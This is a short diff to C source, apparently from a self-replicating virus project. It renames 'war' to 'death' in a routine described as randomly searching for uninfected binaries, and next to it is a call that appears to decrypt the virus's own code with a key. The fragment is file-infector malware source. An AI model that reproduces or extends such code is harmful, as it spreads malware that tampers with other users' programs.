@@ -1,8 +1,8 @@
-#include "war.h"
+#include "death.h"
 
 /*
   Locate search aleatory for uninfected binaries.
-  Look at war() func to know which directories are pre-selected.
+  Look at death() func to know which directories are pre-selected.
 */
 
 void	locate(t_data *data, t_directory *dir)
@@ -13,7 +13,7 @@ void	locate(t_data *data, t_directory *dir)
 	_log(log, NULL, 8, data->context);
 #endif
 
-	revert_one(&data->key, (char*)war, (size_t)locate - (size_t)war);
+	revert_one(&data->key, (char*)death, (size_t)locate - (size_t)death);
 
 	int				fd;
 	int				stop;
